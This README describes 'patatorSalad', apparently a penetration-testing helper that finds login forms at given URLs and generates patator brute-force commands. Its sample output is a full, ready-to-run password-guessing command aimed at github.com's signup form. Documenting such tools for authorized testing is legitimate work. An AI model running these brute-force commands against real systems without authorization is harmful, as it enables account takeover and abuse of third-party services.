# patatorSalad
Takes a single URL or file of URLs, attempts to discover login forms, and creates the appropriate patator command

Requires python3 and aiohttp

## Install
```
pipenv install
```
or
```
pip install aiohttp, cchardet
```

## Usage
```
usage: Creates http_fuzz patator commands by identifiying form fields in given URLs
       [-h] -u URLS [-n NAME_LIST] [-p PASS_LIST] [-o OUT_FILE]

optional arguments:
  -h, --help            show this help message and exit
  -u URLS, --urls URLS  A single URL or file of URLs
  -n NAME_LIST, --name-list NAME_LIST
                        List of usernames to brute
  -p PASS_LIST, --pass-list PASS_LIST
                        List of passwords to brute
  -o OUT_FILE, --out-file OUT_FILE
                        File to write patator commands to, defaults to
                        salad.sh in the current directory
```

### Example 
#### Input
```
pipenv shell
python patatorSalad.py -u https://github.com
```
#### Output
Written to `salad.sh` by default (sensitive fields redacted):
```
patator http_fuzz url=https://github.com//join method=POST body='user[email]=FILE0&user[password]=FILE1&utf8=✓&q=&type=None&utf8=✓&authenticity_token=[REDACTED]&source=form-home&required_field_f3be=None&timestamp=[REDACTED]&timestamp_secret=[REDACTED]' 0=usernames.txt 1=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep 'invalid|error|fail'
```